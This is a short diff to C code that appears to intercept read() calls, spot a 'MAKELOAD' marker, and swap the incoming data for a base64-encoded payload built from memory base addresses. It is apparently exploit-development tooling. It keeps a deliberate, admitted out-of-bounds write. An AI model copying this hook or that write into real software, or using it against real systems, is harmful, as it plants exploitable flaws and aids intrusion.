@@ -17,7 +17,7 @@ static const char s_overload[]	= "OVERLOAD";
 static const char s_overflow[]	= "OVERFLOW";
 
 // In-place substitution of request with result. So wrong...
-static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np, ssize_t  nc) {
+static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np, ssize_t nc) {
         // Generate the payload that we will "echo" back
         unsigned char sPayload64[4096];
         size_t nPayload64 = b64Encode((const unsigned char *) plp, sizeof(*plp), sPayload64, sizeof(sPayload64));
@@ -25,7 +25,7 @@ static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np, ssize_t  nc) {
         // Make room for the payload (where the request used to be).
         char *src = p + nc;
         char *dst = p + nPayload64 - strlen(s_fullmagic) + strlen(s_basemagic) - strlen(s_makeload) + strlen(s_overflow);
-        int delta = dst - src;
+        ssize_t delta = dst - src;
         memmove(dst, src, np - nc);
 
         // Replace s_fullmagic with s_basemagic
@@ -87,9 +87,9 @@ ssize_t read(int fd, void *buf, size_t count) {
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			p += strlen(s_makeload);
 
-			result += makeload(&payload, &baseAddresses, p, result - (p - (char *)buf));
+			ssize_t nc = makeload(&payload, &baseAddresses, p, result - (p - (char *)buf));
 
-			result += falseEcho(&payload, p, result - (p - (char *)buf), result);
+			result += falseEcho(&payload, p, result - (p - (char *)buf), nc);
 
 			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
 			((char *) buf)[result] = 0;
